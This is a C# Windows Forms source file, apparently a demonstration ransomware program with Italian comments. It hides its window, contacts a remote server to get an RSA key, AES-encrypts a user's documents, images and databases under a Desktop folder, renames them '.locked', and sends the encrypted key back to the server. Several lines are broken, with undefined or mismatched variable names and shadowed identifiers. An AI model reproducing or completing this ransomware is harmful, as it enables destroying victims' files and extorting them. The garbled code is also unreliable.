
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Collections.Specialized;
using System.Net;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Security.Cryptography;
using System.IO;
using System.Runtime.InteropServices;



namespace ransExample
{
    public partial class Form1 : Form
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern Int32 SystemParametersInfo(UInt32 action, UInt32 uParam, String vParam, UInt32 winIni);
        private static bool OAEP = false;
        const int dimensioneChiave = 2048; 
        string chiavePubblica;
        string passwordCifrata; 
        string userName = Environment.UserName;
        string computerName = System.Environment.MachineName.ToString();
        string directoryUtente = "C:\\Users\\";
	//crea la coppia di chiavi
        string generatoreUrl = "http://www.esempio.it/createkeys.php";
	//memorizza la chiave aes cifrata con la chiave pubblica
        string salvataggioUrl = "http://www.esempio.it/savekey.php";


        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Opacity = 0;
            this.ShowInTaskbar = false;
            //inizia l'esecuzione al caricamento della form
            inzia_esecuzione();

        }

        private void Form_Shown(object sender, EventArgs e)
        {
            Visible = false;
            Opacity = 100;
        }

        //Crea un richiesta POST verso il Server contenente le informazioni del Client
        //Webserver risponde con un chiave pubblica RSA, salvando la privata sul Server.
        public string getchiavePubblica(string url)
        {

            WebClient webClient = new WebClient();
            NameValueCollection form = new NameValueCollection();
            form["username"] = userName;
            form["pcname"] = computerName;
            byte[] responseBytes = webClient.UploadValues(url, "POST", form);
            string responsefromserver = Encoding.UTF8.GetString(responseBytes);
            webClient.Dispose();
            return responsefromserver;

        }

        //Manda la  password Cifrata al Server tramite una richiesta POST
        public void invioChiave(string url)
        {
            WebClient webClient = new WebClient();
            NameValueCollection form = new NameValueCollection();
            form["pcname"] = computerName;
            form["aesencrypted"] = passwordCifrata;
            Console.WriteLine(passwordCifrata);
            byte[] responseBytes = webClient.UploadValues(url, "POST", form);
            webClient.Dispose();
        }

        //Processo Main dell'applicazione
        public void inzia_esecuzione()
        {
            string path = "\\Desktop\\test";
            string directoryPadre = directoryUtente + userName + path;
            chiavePubblica = getchiavePubblica(generatoreUrl);
            string aesPassword = creaPassword(32);
            cifraDirectory(directoryPadre,aesPassword);
            passwordCifrata = cifraturaRSA(aesPassword,dimensioneChiave, chiavePubblica);
            invioChiave(salvataggioUrl);
            aesPassword = null;
            passwordCifrata = null;
            System.Windows.Forms.Application.Exit();

        }

        //Cifra un file attraverso l'algoritmo AES
        public void cifraFile(string file, string password)
        {

            byte[] byteDaCriptare = File.ReadAllBytes(file);
            byte[] bytePassword = Encoding.UTF8.GetBytes(password);

            bytePassword = SHA256.Create().ComputeHash(bytePassword);

            byte[] cifraturaAES = cifraturaAES(byteDaCriptare, bytePassword);

            File.WriteAllBytes(file, cifraturaAES);
            System.IO.File.Move(file, file + ".locked");
        }

        //Cifra la directory corrente e tutte le sottodirectory
        public void cifraDirectory(string location, string password)
        {

            //Estensioni dei file che verrano cifrati
            var estensioniValide = new[]
            {
                ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd"
            };

            string[] files = Directory.GetFiles(location);
            string[] child = Directory.GetDirectories(location);
            for (int i = 0; i < files.Length; i++)
            {
                string estensioniValide = Path.GetExtensions(files[i]);
                if (estensioniValide.Contains(estensioniValide))
                {
                    cifraFile(files[i], password);
                }
            }
            for (int i = 0; i < child.Length; i++)
            {
                cifraDirectory(child[i], password);
            }


        }

        //Cifra una stringa con la cifratura pubblica RSA
        public static string cifraturaRSA(string text, intdimensioneChiave, string chiavePubblicaXml)
        {
            var encrypted = algoritmoRSA(Encoding.UTF8.GetBytes(text),dimensioneChiave, chiavePubblicaXml);
            return Convert.ToBase64String(encrypted);
        }

        //Algoritmo di cifratura RSA
        public static byte[] algoritmoRSA(byte[] data, int dimensioneChiave, string chiavePubblicaXml)
        {
 
            using (var provider = new RSACryptoServiceProvider(keySize))
            {
                Console.WriteLine(chiavePubblicaXml);
                provider.FromXmlString(chiavePubblicaXml);
                return provider.Encrypt(data, OAEP);
            }
        }


        //Algoritmo di cifratura AES
        public byte[] cifraturaAES(byte[] byteDaCriptare, byte[] bytePassword)
        {
            byte[] byteCifrati = null;
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
            using (MemoryStream memory_stream = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(bytePassword, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);

                    AES.Mode = CipherMode.CBC;

                    using (var crypto_stream = new CryptoStream(memory_stream, AES.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        crypto_stream.Write(byteDaCriptare, 0, byteDaCriptare.Length);
                        crypto_stream.Close();
                    }
                    byteCifrati = memory_stream.ToArray();
                }
            }

            return byteCifrati;
        }

        //Crea un numero intero pseudocasuale
        public static int getRandomValue(RNGCryptoServiceProvider random, int massimo)
        {
            byte[] b = new byte[4];
            int valore;
            do
            {
                random.GetBytes(r);
                value = BitConverter.ToInt32(r, 0) & Int32.MaxValue;
            } while (value >= massimo * (Int32.MaxValue / massimo));
            return value % max;
        }

        //Genera una stringa pseudo casuale
        public static string creaPassword(int length)
        {
            const string alfabeto = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*/&%!="; //pattern
            StringBuilder parola = new StringBuilder();
            using (RNGCryptoServiceProvider random = new RNGCryptoServiceProvider())
            {
                while (length-- > 0)
                {
                   parola.Append(alfabeto[getRandomValue(random, alfabeto.Length)]);
                }
            }
            return parola.ToString();

        }

    }


}
    

